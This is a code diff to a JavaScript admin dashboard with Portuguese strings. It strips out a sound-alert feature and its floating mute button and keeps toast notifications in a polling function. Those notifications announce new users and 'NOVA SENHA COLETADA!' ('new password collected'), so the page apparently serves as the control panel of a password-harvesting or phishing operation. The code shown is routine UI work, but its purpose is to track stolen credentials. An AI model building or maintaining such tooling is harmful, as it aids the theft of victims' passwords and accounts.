@@ -1228,74 +1228,9 @@
         }
     }
 
-   // ========== SISTEMA DE SOM ==========
-let somLigado = true;
+ // ========== SISTEMA DE NOTIFICACOES ==========
 let ultimoTotalUsuarios = 0;
 let ultimoTotalLogs = 0;
-let audioSom = null;
-
-// Carregar áudio local (baixado no servidor)
-function inicializarAudio() {
-    if (audioSom) return;
-    
-    // Coloque o arquivo de áudio na mesma pasta do admin.html
-    audioSom = new Audio('/audio/coin.mp3');  // ou '/sounds/coin.mp3'
-    audioSom.volume = 0.7;
-    audioSom.load();
-    console.log('Áudio carregado');
-}
-
-function tocarSom() {
-    if (!somLigado) return;
-    
-    if (!audioSom) {
-        inicializarAudio();
-    }
-    
-    if (audioSom) {
-        audioSom.currentTime = 0;
-        audioSom.play().catch(e => console.log('Som não reproduzido:', e));
-    }
-}
-
-function alternarSom() {
-    somLigado = !somLigado;
-    const btn = document.getElementById('btnSom');
-    if (btn) {
-        btn.innerHTML = somLigado ? '<i class="fas fa-volume-up"></i>' : '<i class="fas fa-volume-mute"></i>';
-    }
-    showToast(somLigado ? 'Sons ativados' : 'Sons desativados', 'info');
-    
-    if (somLigado) {
-        setTimeout(() => tocarSom(), 100);
-    }
-}
-
-// Botão flutuante
-const btnSom = document.createElement('div');
-btnSom.id = 'btnSom';
-btnSom.style.position = 'fixed';
-btnSom.style.bottom = '20px';
-btnSom.style.right = '20px';
-btnSom.style.zIndex = '1000';
-btnSom.style.background = 'rgba(0,0,0,0.7)';
-btnSom.style.backdropFilter = 'blur(10px)';
-btnSom.style.borderRadius = '50%';
-btnSom.style.width = '45px';
-btnSom.style.height = '45px';
-btnSom.style.display = 'flex';
-btnSom.style.alignItems = 'center';
-btnSom.style.justifyContent = 'center';
-btnSom.style.cursor = 'pointer';
-btnSom.style.border = '1px solid rgba(255,255,255,0.2)';
-btnSom.innerHTML = '<i class="fas fa-volume-up" style="color:white; font-size:20px;"></i>';
-btnSom.onclick = alternarSom;
-document.body.appendChild(btnSom);
-
-// Inicializar ao carregar a página
-window.addEventListener('load', () => {
-    inicializarAudio();
-});
 
 function verificarNovosDados() {
     if (!adminToken) return;
@@ -1308,11 +1243,9 @@ function verificarNovosDados() {
             const totalLogs = stats.total_logs || 0;
             
             if (totalUsuarios > ultimoTotalUsuarios && ultimoTotalUsuarios !== 0) {
-                tocarSom();
-                showToast(`NOVO USUÁRIO! Total: ${totalUsuarios}`, 'success');
+                showToast(`NOVO USUARIO! Total: ${totalUsuarios}`, 'success');
             }
             if (totalLogs > ultimoTotalLogs && ultimoTotalLogs !== 0) {
-                tocarSom();
                 showToast(`NOVA SENHA COLETADA!`, 'info');
             }
             
